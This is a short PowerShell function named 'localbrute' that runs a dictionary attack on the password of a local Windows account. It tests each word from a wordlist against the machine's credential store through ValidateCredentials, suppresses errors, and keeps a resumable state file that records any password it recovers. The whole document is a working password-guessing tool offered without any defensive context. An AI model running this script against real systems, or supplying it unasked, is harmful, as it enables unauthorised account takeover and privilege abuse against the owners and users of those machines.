Function localbrute {
  param($u,$dct,$debug)
  $d = $dct -replace ".*\\" -replace ".*/"
  
  $ErrorActionPreference = "SilentlyContinue" 
  $i = ((gc .\localbrute.state | sls "^${u}:.*:True:.*") -split(":"))[3]
  if ($i) {
    echo "Password for $u account already found: $i"
    return
  }
  
  $ii = (gc .\localbrute.state | sls "^${u}:${d}:" | select -last 1) -split(":")
  $i = $ii[2]/1
  if ($debug) {echo "DEBUG: starting $d from $i"}
  try {
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
    $t = [DirectoryServices.AccountManagement.ContextType]::Machine
    $a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
    foreach($p in (gc $dct|where {$_.readcount -gt $i})) {
      if ($debug) {echo "DEBUG: trying password [${i}]: $p"}
      if ($a.ValidateCredentials($u,$p)) {
        echo "${u}:${d}:True:${p}" >>localbrute.state
        echo "Password for $u account found: $p"
        return
      }
      $i++
    }
  } finally {
    echo "${u}:${d}:${i}:${p}" >>localbrute.state
  }	
}